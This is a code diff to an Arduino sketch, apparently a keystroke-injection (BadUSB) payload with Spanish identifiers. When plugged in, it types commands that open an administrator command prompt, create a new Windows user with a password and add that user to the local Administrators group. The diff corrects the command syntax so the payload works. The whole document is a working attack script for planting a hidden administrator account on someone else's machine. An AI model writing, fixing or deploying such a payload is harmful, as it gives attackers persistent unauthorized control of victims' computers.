@@ -5,7 +5,7 @@
 
 */
 
-#include <Keyboard.h>
+#include "Keyboard.h"
 #define Escribir Keyboard.print
 
 #define WINDOWS   0x83
@@ -56,7 +56,7 @@ void Ejecutar() {
 void cmd() {
 
   Ejecutar();
-  Escribir("powershell Start/Process cmd.exe /Verb runAs");
+  Escribir("powershell Start-Process cmd.exe -Verb runAs");
   Enter();
   delay(6000);
   Derecha();
@@ -73,10 +73,13 @@ void Payload() {
 
 
   cmd();
-  Escribir("NET USER " + usuario + " " + password + " &ADD");
+  Escribir("NET USER " + usuario + " " + password + " /ADD");
   Enter();
-  Escribir("Net LocalGroup Administradores " + usuario + " &ADD");
+  Escribir("Net LocalGroup Administradores " + usuario + " /ADD");
   Enter();
   Escribir("exit");
   Enter();
+
+    Keyboard.end();
 }
+
